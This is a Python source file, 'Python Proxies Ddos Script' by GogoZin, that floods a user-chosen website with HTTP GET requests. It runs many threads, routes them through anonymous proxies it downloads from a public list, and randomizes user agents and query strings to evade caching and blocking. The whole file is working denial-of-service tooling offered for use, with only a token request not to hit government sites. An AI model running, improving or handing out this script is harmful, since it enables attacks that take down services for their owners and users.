#Code By GogoZin
#Can Be A Skid But Don't Be A Theif
import socks
import time
import socket
import random
import requests
from threading import Thread
from colorama import Fore

print(Fore.RED + """MMMMMMMMMMMMMMMMMMKkkKMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMNOxx0WMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMWKolldKMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMXx,..;kXMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMNO:.  .cOWMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMWKo.    .dKMMMMMMMMMMMMMMM
MMMMMWWWWWMMMMNO;      :ONMMMMWWWWWMMMMM
MWX0kdooodk0XNXk,      ,kXNX0kdolodOKNWM
Kxc'.     ..;oxd,      ;dxl;..     .'lON
o,            .cc.    .c:.            ;x
:    .,;::;,.   .     ..   .,;::;,.   .c
l. .lOKXNNXKOd;.        .;dOXNNNXKkc. .l
KdcdKWMMMMMMMN0o.      'o0NMMMMMMMW0ocdK
MNKXWMMMMMMMMMXx,      ;kNMMMMMMMMMWXXWM
MMMMMMMMMMMMMMXd'      ,xXMMMMMMMMMMMMMM
MMMMMMMMMNK0XNXkc.    .lONWXKXWMMMMMMMMM
MMMMMMMMW0l;cll;.      .:lo:;lKWMMMMMMMM
MMMMMMMMNO:.   .'.    ''.   .:ONMMMMMMMM
MMMMMMMMMNOdlloxkl.  .lkkocld0NMMMMMMMMM
MMMMMMMMMMMWNNWWXx,..;kNMWNNWMMMMMMMMMMM
MMMMMMMMMMMMMMMMMXxloxXMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMWKkkKMMMMMMMMMMMMMMMMMM""")

print(Fore.GREEN + "      Python Proxies Ddos Script")
print(Fore.GREEN + "           Code By GogoZin") #Code By GogoZin
print(Fore.BLUE + "    Please Don't Attack Any Gov Site")

userag =["Mozilla/5.0 (Windows; U; Windows NT 6.1; sv-SE) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"]
acpt =["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n","Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n","Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",]


def main():
	global url
	global port
	global pprr
	global pow
	url = str(input(Fore.WHITE + "Target : " + Fore.YELLOW))
	sl = str(input(Fore.WHITE + "Use SSL Mode ? (y/n) : " + Fore.YELLOW))
	port = int(input(Fore.WHITE + "Port : " + Fore.YELLOW))
	thr = int(input(Fore.WHITE + "Threads : " + Fore.YELLOW))
	pow = int(input(Fore.WHITE + "CC.Power (1-100) : " + Fore.YELLOW))
	cho = str(input(Fore.WHITE + "Get Some Fresh Proxies ? (y/n) : " + Fore.YELLOW))                                                           #Code By GogoZin
	if cho =='y':
		if sl =='n':
			rsp = requests.get('https://www.proxy-list.download/api/v1/get?type=http&anon=anonymous')
			with open("proxies.txt","wb") as fp:
				fp.write(rsp.content)
				print(Fore.CYAN + "Sucess Get Htpp Proxies List !")
		else:
			rsp = requests.get('https://www.proxy-list.download/api/v1/get?type=https&anon=anonymous')
			with open("proxies.txt","wb") as fp:
				fp.write(rsp.content)
				print(Fore.CYAN + "Sucess Get Https Proxies List !")
	else:
		pass
	list = str(input(Fore.WHITE + "Input Proxies List (proxies.txt) : " + Fore.YELLOW))
	print(Fore.CYAN + "Proxies Counts %s" %(len(open(list).readlines())))
	time.sleep(1)
	pprr = open(list).readlines()
	for x in range(thr):
		x = Thread(target=atk, name=(x))
		x.start()

def atk():
	xzc = random.randint(100,6553500)
	get_host = "GET /?="+ str(xzc) +" HTTP/1.1\r\nHost: " + str(url)+ "\r\n"
	connection = "Connection: Keep-Alive\r\n"
	useragent = "User-Agent: " + random.choice(userag) + "\r\n"                                               #Code By GogoZin
	accept = random.choice(acpt)
	rqs = get_host + useragent + accept + connection + "\r\n"
	#pprr = open(list).readlines()
	proxy = random.choice(pprr).strip().split(":")
	while True:
		try:
			socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True)
			s = socks.socksocket()
			s.connect((str(url), int(port)))
			s.send(str.encode(rqs))
			print(Fore.CYAN + "Sucess Sent Requests From ~> " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]))
			try:
				for i in range(pow):                                                          #Code By GogoZin
					s.send(str(encode(rqs)))
			except:
				s.close()
		except:
			s.close()
			print(Fore.RED + "Proxies Get Error !" + Fore.WHITE)


if __name__ =='__main__':
	main()
